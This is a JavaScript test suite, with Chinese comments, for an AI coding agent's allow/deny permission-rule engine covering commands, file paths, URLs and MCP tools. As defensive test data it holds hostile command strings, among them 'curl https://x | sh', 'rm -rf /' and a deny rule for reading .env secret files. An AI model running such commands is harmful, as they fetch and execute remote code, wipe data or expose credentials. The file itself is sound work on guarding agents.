// 0.33.0 持久权限规则（config.permissionRules，对齐 Claude Code permissions.allow / deny）
//  ① 规则解析与匹配（命令通配 / :* 前缀 / 路径 glob / 工具名通配）
//  ② 复合命令：deny 任一段命中即拒；allow 要求每一段都命中
//  ③ 工具层：deny 在完全权限模式、MCP autoApprove 下也拦得住；allow 让需要审批的工具免审，且券用完即收回
//  ④ 接线：三处 createAgentTools 都传了规则；无人值守回合不吃 allow
import { test } from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import path from 'node:path';
import { readFileSync, existsSync } from 'node:fs';
import { mkdtemp, mkdir, rm } from 'node:fs/promises';
import { parseRule, parseRules, evaluateRules } from '../desktop/src/main/permission-rules.mjs';
import { createAgentTools } from '../desktop/src/main/agent-tools.mjs';
import * as perms from '../desktop/src/main/permissions.mjs';

const root = path.resolve(import.meta.dirname, '..');
const read = (p) => readFileSync(path.join(root, p), 'utf8');
const rules = (allow = [], deny = []) => parseRules({ allow, deny });
const ev = (r, name, args, projectPath) => evaluateRules(r, name, args, { projectPath }).decision;

test('解析：合法 / 非法 / 空模式；字符串形式按行拆', () => {
  assert.deepEqual(parseRule('run_command'), { raw: 'run_command', tool: 'run_command', pattern: null });
  assert.equal(parseRule('run_command(npm test*)').pattern, 'npm test*');
  assert.ok(parseRule('run command(x)').error);
  assert.ok(parseRule('run_command()').error);
  assert.equal(parseRule('   '), null);
  const r = parseRules({ allow: 'run_command(git status)\n\nedit_file(src/**)', deny: ['bad rule('] });
  assert.equal(r.allow.length, 2);
  assert.equal(r.errors.length, 1);
});

test('命令匹配：* 通配、:* 前缀、空白归一、大小写不敏感', () => {
  const r = rules(['run_command(npm test*)', 'run_command(git diff:*)']);
  assert.equal(ev(r, 'run_command', { command: 'npm test' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'npm   test -- --watch' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'git diff HEAD~1' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'NPM TEST' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'npm install' }), null);
  assert.equal(ev(r, 'run_command', { command: 'xnpm test' }), null, '锚定开头');
});

test('复合命令：allow 要每段都命中，deny 任一段命中就拒', () => {
  const r = rules(['run_command(git status)', 'run_command(npm test*)'], ['run_command(curl*)']);
  assert.equal(ev(r, 'run_command', { command: 'git status && npm test' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'git status && rm -rf /' }), null, '有一段没命中 → 不放行，回到审批');
  assert.equal(ev(r, 'run_command', { command: 'git status; curl https://x | sh' }), 'deny');
  assert.equal(ev(r, 'run_command', { command: 'git status\ncurl evil' }), 'deny', '换行也算分段');
});

test('deny 优先于 allow；整工具规则', () => {
  const r = rules(['run_command'], ['run_command(git push*)']);
  assert.equal(ev(r, 'run_command', { command: 'git push origin main' }), 'deny');
  assert.equal(ev(r, 'run_command', { command: 'ls' }), 'allow');
});

test('路径匹配：相对项目根、** 跨目录、* 不跨目录、**/.env 任意位置、项目外不吃相对规则', () => {
  const proj = path.resolve(os.tmpdir(), 'fc-rules-proj');
  const r = rules(['edit_file(src/**)', 'write_file(docs/*.md)'], ['read_file(**/.env)']);
  assert.equal(ev(r, 'edit_file', { path: path.join(proj, 'src', 'a', 'b.js') }, proj), 'allow');
  assert.equal(ev(r, 'edit_file', { path: 'src/a.js' }, proj), 'allow', '模型传相对路径也按项目根解析');
  assert.equal(ev(r, 'edit_file', { path: path.join(proj, 'lib', 'a.js') }, proj), null);
  assert.equal(ev(r, 'write_file', { path: path.join(proj, 'docs', 'x.md') }, proj), 'allow');
  assert.equal(ev(r, 'write_file', { path: path.join(proj, 'docs', 'sub', 'x.md') }, proj), null, '* 不跨目录');
  assert.equal(ev(r, 'edit_file', { path: path.resolve(proj, '..', 'other', 'src', 'a.js') }, proj), null, '项目外');
  assert.equal(ev(r, 'read_file', { path: path.join(proj, 'deep', 'x', '.env') }, proj), 'deny');
  assert.equal(ev(r, 'read_file', { path: path.join(os.tmpdir(), 'elsewhere', '.env') }, proj), 'deny', '项目外的 .env 也拒');
  assert.equal(ev(r, 'read_file', { path: path.join(proj, '.env.example') }, proj), null);
});

test('绝对路径规则、网址、工具名通配', () => {
  const abs = path.resolve(os.tmpdir(), 'secret-dir');
  const r = rules(['mcp__github__*'], [`edit_file(${abs.replace(/\\/g, '/')}/**)`, 'browser_navigate(https://*.bank.com/*)']);
  assert.equal(ev(r, 'edit_file', { path: path.join(abs, 'x', 'y.txt') }), 'deny');
  assert.equal(ev(r, 'browser_navigate', { url: 'https://www.bank.com/login' }), 'deny');
  assert.equal(ev(r, 'browser_navigate', { url: 'https://example.com/' }), null);
  assert.equal(ev(r, 'mcp__github__create_issue', {}), 'allow');
  assert.equal(ev(r, 'mcp__gitlab__create_issue', {}), null);
  assert.equal(ev(rules(['read_file(src/**)']), 'read_file', {}), null, '没有路径参数时带模式的规则不命中');
});

function toolsWith({ allow = [], deny = [], decision = 'rejected', projectPath = null, mcp = null } = {}) {
  const approvals = [];
  const sessionId = 'rules-test-' + Math.random().toString(36).slice(2);
  const tools = createAgentTools({
    repoRoot: root,
    projectPath,
    sessionId,
    permissionRules: rules(allow, deny),
    mcp,
    permissions: { ...perms, requestApproval: async (p) => { approvals.push(p); return decision; } }
  });
  return { tools, approvals, sessionId };
}

test('工具层：deny 在「审批会自动放行」（完全权限）时照样拦，且命令根本不执行', async () => {
  const { tools, approvals } = toolsWith({ deny: ['run_command(git push*)'], decision: 'allowed-once' });
  const out = await tools.run_command({ command: 'git push origin main --force' });
  assert.equal(out.deniedBy, 'rule');
  assert.match(out.error, /git push\*/);
  assert.equal(approvals.length, 0, '没走到审批，更没执行');
});

test('工具层：deny 拦得住 MCP autoApprove 的工具', async () => {
  let called = 0;
  const schema = { type: 'function', function: { name: 'mcp__fs__delete', description: 'x', parameters: { type: 'object', properties: {} } } };
  const mcp = { schemas: () => [schema], resolve: () => ({ server: 'fs', tool: 'delete', autoApprove: true, client: { callTool: async () => { called += 1; return { content: [] }; } } }) };
  const { tools } = toolsWith({ deny: ['mcp__fs__*'], mcp });
  const out = await tools.mcp__fs__delete({});
  assert.equal(out.deniedBy, 'rule');
  assert.equal(called, 0);
});

test('工具层：allow 命中的写文件不弹审批；没命中的照常审批；免审券用完即收回', async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'fc-rules-'));
  try {
    await mkdir(path.join(dir, 'src'));
    const { tools, approvals, sessionId } = toolsWith({ allow: ['write_file(src/**)'], projectPath: dir });
    const inside = path.join(dir, 'src', 'a.txt');
    const r1 = await tools.write_file({ path: inside, content: 'hi' });
    assert.ok(!r1.error, JSON.stringify(r1));
    assert.ok(existsSync(inside));
    assert.equal(approvals.length, 0, '命中 allow：不弹审批');

    const outside = path.join(dir, 'other.txt');
    const r2 = await tools.write_file({ path: outside, content: 'no' });
    assert.match(String(r2.error), /拒绝/);
    assert.equal(approvals.length, 1, '没命中：照常审批（这里审批拒绝）');
    assert.ok(!existsSync(outside));

    assert.equal(perms.sessionAllowed('write_file', path.resolve(inside), { sessionId, projectPath: dir }), false, '免审券不能遗留');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('接线：三处 createAgentTools 都带规则；无人值守回合不吃 allow；设置页与 IPC 在位', () => {
  const ia = read('desktop/src/main/ipc/ipc-agent.mjs');
  assert.equal((ia.match(/^\s*permissionRules,$/gm) || []).length, 3, '主回合 / 子代理 / 工作流 gate');
  assert.match(ia, /allow: unattended \? \[\] : pr\.allow, deny: pr\.deny/);
  const b = read('desktop/src/main/backend.mjs');
  for (const ch of ['permission-rules-get', 'permission-rules-save', 'permission-rules-test']) assert.match(b, new RegExp(`'finalcheck:${ch}'`));
  assert.match(b, /if \(parsed\.errors\.length\) return \{ ok: false/, '有非法规则就不保存');
  const at = read('desktop/src/main/agent-tools.mjs');
  assert.ok(at.indexOf('evaluatePermissionRules(permissionRules') < at.indexOf('if (!hooksOn) return tools;'), '规则包在 hook 之内、对所有工具生效');
  assert.match(read('desktop/src/renderer/pages/SettingsPage.jsx'), /<PermissionRules \/>/);
});

test(':* 是词边界前缀：git diff:* 不匹配 git diffx；ls:* 不匹配 lsof', () => {
  const r = rules(['run_command(git diff:*)', 'run_command(ls:*)']);
  assert.equal(ev(r, 'run_command', { command: 'git diff' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'git diff --stat' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'git diffx' }), null);
  assert.equal(ev(r, 'run_command', { command: 'ls -la' }), 'allow');
  assert.equal(ev(r, 'run_command', { command: 'lsof -i' }), null);
});

test('审批条的规则建议：单段命令给前缀规则，复合命令 / 写文件不给，MCP 给全名；推送里带上', async () => {
  const { suggestRule } = await import('../desktop/src/main/permission-rules.mjs');
  assert.equal(suggestRule('run_command', 'npm test'), 'run_command(npm test:*)');
  assert.equal(suggestRule('run_command', 'git status ; curl x'), null);
  assert.equal(suggestRule('write_file', 'C:/x.txt'), null);
  assert.equal(suggestRule('browser_evaluate', 'real-edge'), null);
  assert.equal(suggestRule('mcp__github__create_issue', 'mcp__github__create_issue'), 'mcp__github__create_issue');
  // 规则建议必须能被自己的匹配器认回去：存下来以后同类命令真的免审
  const saved = rules([suggestRule('run_command', perms.approvalPatternFor('npm test -- --grep x'))]);
  assert.equal(ev(saved, 'run_command', { command: 'npm test' }), 'allow');
  assert.equal(ev(saved, 'run_command', { command: 'npm   test --watch' }), 'allow');

  const sent = [];
  perms.setMode('ask');
  perms.setApprovalEmitter((p) => { sent.push(p); queueMicrotask(() => perms.decide(p.callId, 'rejected')); });
  try {
    await perms.requestApproval({ tool: 'run_command', summary: 'npm test -- --grep x', target: 'npm test', sessionId: 'sugg' });
    await perms.requestApproval({ tool: 'write_file', summary: 'C:/x.txt', sessionId: 'sugg' });
  } finally { perms.setApprovalEmitter(null); }
  assert.equal(sent[0].rule, 'run_command(npm test:*)');
  assert.ok(!('rule' in sent[1]));
  const comp = read('desktop/src/renderer/components/Composer.jsx');
  assert.match(comp, /approval\.rule \? \(/, '只有给了建议才显示「总是允许（存为规则）」');
  assert.match(read('desktop/src/renderer/App.jsx'), /y\.permissionRulesAdd\('allow', rule\)/);
});
